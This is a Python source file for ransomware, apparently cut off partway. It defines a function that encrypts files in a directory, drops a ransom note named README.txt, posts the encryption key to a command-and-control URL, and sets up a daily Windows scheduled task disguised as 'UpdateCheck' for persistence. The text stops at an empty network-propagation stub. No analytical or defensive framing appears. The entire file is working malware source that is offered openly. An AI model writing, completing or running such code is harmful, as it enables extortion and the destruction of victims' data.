import os
import socket
import subprocess
import requests
from cryptography.fernet import Fernet

def ransomware_with_network_propagation(directory: str, note: str, c2_url: str, network_range: str) -> None:
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)
    
    def encrypt_file(file_path):
        with open(file_path, 'rb') as file:
            file_data = file.read()
        encrypted_data = cipher_suite.encrypt(file_data)
        with open(file_path, 'wb') as file:
            file.write(encrypted_data)
    
    def create_ransom_note(note_content):
        with open(os.path.join(directory, 'README.txt'), 'w') as note_file:
            note_file.write(note_content)
    
    def send_key_to_c2(c2_url, key):
        try:
            response = requests.post(c2_url, data={'key': key.decode()})
            if response.status_code != 200:
                print("Failed to send key to C2 server")
        except Exception as e:
            print(f"Error sending key to C2 server: {e}")
    
    def ensure_persistence():
        script_path = os.path.abspath(__file__)
        subprocess.run(['schtasks', '/create', '/tn', 'UpdateCheck', '/tr', f'"{script_path}"', '/sc', 'daily', '/st', '08:00'], check=True)
    
    def propagate(network_range):
